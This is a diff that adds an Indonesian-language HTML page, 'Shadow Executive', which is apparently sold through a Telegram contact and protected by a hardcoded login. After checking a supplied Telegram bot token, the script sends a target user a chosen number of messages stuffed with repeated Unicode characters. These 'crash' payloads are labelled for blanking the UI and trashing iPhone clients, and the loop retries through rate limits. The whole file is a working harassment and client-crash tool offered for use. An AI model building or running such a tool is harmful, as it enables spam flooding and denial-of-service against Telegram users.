@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shadow Executive</title>
+<style>
+  /* Background biru-hitam dengan gradient */
+  body {
+    margin: 0; padding: 0;
+    font-family: Arial, sans-serif;
+    background: url('https://pomf2.lain.la/f/jz76ylxg.jpg') no-repeat center center fixed;
+    color: white;
+    overflow: hidden;
+  }
+
+  /* Efek asap kebul merah */
+  .smoke {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    pointer-events: none;
+    background: radial-gradient(circle at 30% 40%, rgba(255, 0, 0, 0.15), transparent 50%),
+                radial-gradient(circle at 70% 60%, rgba(255, 50, 50, 0.12), transparent 50%),
+                radial-gradient(circle at 50% 30%, rgba(200, 0, 0, 0.1), transparent 50%);
+    animation: smokeMove 10s infinite alternate ease-in-out;
+    z-index: 0;
+  }
+  @keyframes smokeMove {
+    0% {
+      background-position: 30% 40%, 70% 60%, 50% 30%;
+    }
+    100% {
+      background-position: 32% 42%, 68% 58%, 52% 32%;
+    }
+  }
+
+  /* Container utama */
+  .page {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    position: relative;
+    z-index: 10;
+  }
+
+  .container {
+    background: rgba(0, 0, 0, 0.7);
+    padding: 25px 30px;
+    border-radius: 15px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
+    animation: slideUp 0.8s ease;
+  }
+
+  @keyframes slideUp {
+    from {transform: translateY(50px); opacity: 0;}
+    to {transform: translateY(0); opacity: 1;}
+  }
+
+  .logo {
+    width: 80px; height: 80px; border-radius: 50%;
+    margin: 0 auto 15px auto;
+    display: block;
+    border: 2px solid #ff0000;
+    box-shadow: 0 0 10px #ff0000;
+  }
+
+  .bot-name {
+    text-align: center;
+    font-weight: bold;
+    font-size: 24px;
+    margin-bottom: 25px;
+    text-shadow: 0 0 10px #ff0000;
+  }
+
+  input, select, button {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+  }
+
+  input, select {
+    background: #111;
+    color: #fff;
+    box-shadow: inset 0 0 5px rgba(255, 0, 0, 0.6);
+  }
+
+  input::placeholder, select option {
+    color: #bbb;
+  }
+
+  button {
+    background-color: #ff1e1e;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 0 12px #ff1e1e;
+    transition: background-color 0.3s ease;
+  }
+
+  button:hover {
+    background-color: #cc0000;
+  }
+
+  pre {
+    background: rgba(255, 0, 0, 0.15);
+    padding: 12px;
+    border-radius: 8px;
+    height: 140px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    color: #fff;
+    font-family: monospace;
+  }
+
+  a.buy-link {
+    color: #ff6666;
+    font-weight: bold;
+    text-decoration: none;
+  }
+  a.buy-link:hover {
+    text-decoration: underline;
+  }
+
+  #developerButton {
+    background-color: #b30000;
+    margin-top: 10px;
+  }
+  #developerButton:hover {
+    background-color: #800000;
+  }
+</style>
+</head>
+<body>
+
+<div class="smoke"></div>
+
+<!-- Halaman Login -->
+<div id="pageLogin" class="page" style="display:flex;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/8ftnjvru.png" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="text" id="loginUsername" placeholder="Username" autocomplete="off" />
+    <input type="password" id="loginPassword" placeholder="Password" autocomplete="off" />
+    <button onclick="checkLogin()">Login</button>
+    <p id="loginError" style="color:#ff4444; margin-top:10px;"></p>
+    <button id="developerButton" style="display:none;" onclick="openDeveloper()">DEVELOPER</button>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/8ftnjvru.png" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+  </div>
+</div>
+
+<!-- Loading -->
+<div id="pageLoading" class="page">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Kirim Pesan -->
+<div id="pageSpam" class="page">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/8ftnjvru.png" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah pesan" value="1" min="1" />
+
+    <select id="messageSelect">
+      <option value="" disabled selected>Select Button Bug</option>
+      <option value="crash_ui">Blanking</option>
+      <option value="crash_ios">IPhone Trash</option>
+    </select>
+
+    <button onclick="sendSpam()">Sending Bug</button>
+
+    <h3>Log:</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<script>
+  const validUsername = "XyzzMoods";
+  const validPassword = "kacung123";
+
+  const pageLogin = document.getElementById("pageLogin");
+  const page1 = document.getElementById("page1");
+  const pageLoading = document.getElementById("pageLoading");
+  const pageSpam = document.getElementById("pageSpam");
+  const consoleOutput = document.getElementById("consoleOutput");
+  const loginError = document.getElementById("loginError");
+  const developerButton = document.getElementById("developerButton");
+
+  let botToken = "";
+
+  pageLogin.style.display = "flex";
+
+  function checkLogin() {
+    const username = document.getElementById("loginUsername").value.trim();
+    const password = document.getElementById("loginPassword").value.trim();
+
+    if (username === validUsername && password === validPassword) {
+      loginError.textContent = "";
+      developerButton.style.display = "none";
+      pageLogin.style.display = "none";
+      page1.style.display = "flex";
+    } else {
+      loginError.innerHTML = `Username atau password salah. Silahkan beli akses di <a href="https://t.me/XyzzMoodss" target="_blank" class="buy-link">https://t.me/XyzzMoodss</a>`;
+      developerButton.style.display = "block";
+    }
+  }
+
+  function openDeveloper() {
+    window.open("https://t.me/XyzzMoodss", "_blank");
+  }
+
+  function checkToken() {
+    botToken = document.getElementById("botTokenInput").value.trim();
+    if (!botToken) return alert("Masukkan token bot!");
+
+    page1.style.display = "none";
+    pageLoading.style.display = "flex";
+
+    fetch(`https://api.telegram.org/bot${botToken}/getMe`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          pageLoading.style.display = "none";
+          pageSpam.style.display = "flex";
+          consoleOutput.textContent = "[✓] Token valid. Silahkan gunakan fitur.";
+        } else {
+          alert("Token tidak valid!");
+          pageLoading.style.display = "none";
+          page1.style.display = "flex";
+        }
+      })
+      .catch(() => {
+        alert("Gagal memeriksa token!");
+        pageLoading.style.display = "none";
+        page1.style.display = "flex";
+      });
+  }
+
+  function getCrashUIMessage() {
+    const header = '𝗦𝗵𝗮𝗱𝗼𝘄𝗘𝘅𝗲 𝗜𝘀 𝗛𝗲𝗿𝗲!!🩸';
+    const unicodeFlood = 'ꦾ';
+    const maxTelegramLength = 4000;
+    const repeatedFlood = unicodeFlood.repeat(Math.floor((maxTelegramLength - header.length) / unicodeFlood.length));
+    return header + repeatedFlood;
+  }
+
+  function getCrashIOSMessage() {
+    const header = '𝗦𝗵𝗮𝗱𝗼𝘄 𝗞𝗶𝗹𝗹 𝗜𝗼𝘀!!🩸';
+    const unicodeFlood = '𑇂𑆵𑆴𑆿';
+    const maxTelegramLength = 4000;
+    const repeatedFlood = unicodeFlood.repeat(Math.floor((maxTelegramLength - header.length) / unicodeFlood.length));
+    return header + repeatedFlood;
+  }
+
+  async function sendSpam() {
+    const target = document.getElementById("targetId").value.trim();
+    const count = parseInt(document.getElementById("msgCount").value, 10);
+    const selected = document.getElementById("messageSelect").value;
+
+    if (!target || !count || !selected) {
+      alert("Isi semua kolom dan pilih fitur!");
+      return;
+    }
+
+    let message = "";
+    if (selected === "crash_ui") {
+      message = getCrashUIMessage();
+    } else if (selected === "crash_ios") {
+      message = getCrashIOSMessage();
+    }
+
+    let sent = 0;
+    consoleOutput.textContent = "";
+
+    for (let i = 0; i < count; i++) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: target, text: message }),
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+          sent++;
+          consoleOutput.textContent += `[${i + 1}] bug sucessfully sending.\n`;
+        } else if (data.parameters && data.parameters.retry_after) {
+          consoleOutput.textContent += `⏳ Limit, tunggu ${data.parameters.retry_after} detik...\n`;
+          await new Promise(r => setTimeout(r, data.parameters.retry_after * 1000));
+          i--;
+        } else {
+          consoleOutput.textContent += `[${i + 1}] Gagal: ${data.description}\n`;
+        }
+      } catch (e) {
+        consoleOutput.textContent += `[${i + 1}] Error: ${e.message}\n`;
+      }
+    }
+    consoleOutput.textContent += `✅ Berhasil sending ${sent}/${count} bug`;
+  }
+</script>
+
+</body>
+</html>
